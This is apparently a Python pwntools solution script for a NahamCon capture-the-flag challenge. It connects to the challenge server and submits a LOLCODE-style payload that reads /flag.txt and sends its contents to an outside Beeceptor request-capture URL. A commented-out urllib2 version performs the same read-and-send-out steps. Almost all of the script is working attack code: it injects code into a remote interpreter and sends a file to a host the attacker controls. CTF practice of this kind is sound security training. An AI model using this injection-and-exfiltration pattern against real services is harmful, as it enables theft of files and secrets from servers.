#!/usr/bin/env python3

#  You can use your own server or tool like RequestBin or Beeceptor to intercept request in an easy way
#  Flag will apear in the url

from pwn import *

p = remote('challenge.nahamcon.com', 30079)

URL = "https://lold2.free.beeceptor.com/"

#  import urllib2
#  import urllib
#  data = open("/flag.txt").read()
#  url = URL + data
#  req. = urllib2.Request(url)
#  urllib2.urlopen(req)

payload = f'''GIMME urllib2
GIMME urllib
data CAN HAS open WIT "/flag.txt"! OWN read THING
url CAN HAS "{URL}" ALONG WITH data
req CAN HAS urllib2 OWN Request WIT url !
urllib2 OWN urlopen WIT req !
'''

print(p.recvuntil('MAYB I RUN 4 U!').decode(encoding='ascii'))
p.sendline(payload)
print("Flag:", p.recvall().decode(encoding='ascii').strip().replace("flag", "flag{") + "}")
